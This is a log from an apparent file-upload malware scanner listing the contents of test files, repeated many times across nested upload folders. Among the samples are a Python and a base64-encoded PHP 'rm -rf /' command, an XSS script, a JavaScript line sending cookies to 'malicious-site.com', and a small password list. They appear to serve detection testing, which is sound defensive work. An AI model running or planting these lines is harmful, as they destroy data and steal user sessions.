2025-02-22 20:51:47,267 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:47,268 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:47,270 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:47,272 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:47,273 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:47,275 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:47,276 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:47,278 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:47,280 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:47,282 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:47,283 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:47,285 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:47,288 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:47,289 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:47,292 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:47,293 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:47,294 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:47,295 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:47,297 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:47,298 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:47,300 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:47,310 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:47,311 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:47,312 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:47,315 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:47,317 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:47,320 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:47,321 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:47,323 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:47,325 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:47,327 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:47,328 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:47,330 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:47,338 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:47,340 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:47,341 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:47,343 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:47,344 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:47,347 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:47,348 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:47,349 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:47,350 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:47,351 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:47,353 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:47,354 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:47,359 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:47,360 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:47,361 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:47,364 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:47,365 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:47,368 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:47,369 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:47,370 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:47,371 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:47,372 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:47,373 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:47,374 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:47,380 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:47,381 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:47,383 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:47,384 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:47,385 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:47,386 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:47,387 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:47,388 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:47,389 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:47,390 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:47,392 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:47,393 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:47,394 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:47,395 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:47,396 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:47,397 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:47,398 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:47,399 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:47,401 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:47,402 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:47,403 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:47,404 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:47,405 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:47,406 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:47,407 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:47,409 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:47,410 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:47,412 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:47,413 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:47,414 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:47,415 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:47,416 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:47,417 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:47,418 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:47,419 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:47,421 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:47,422 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:47,423 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:47,424 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:47,425 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:47,426 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:47,427 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:47,428 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:47,429 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:47,431 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:47,432 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
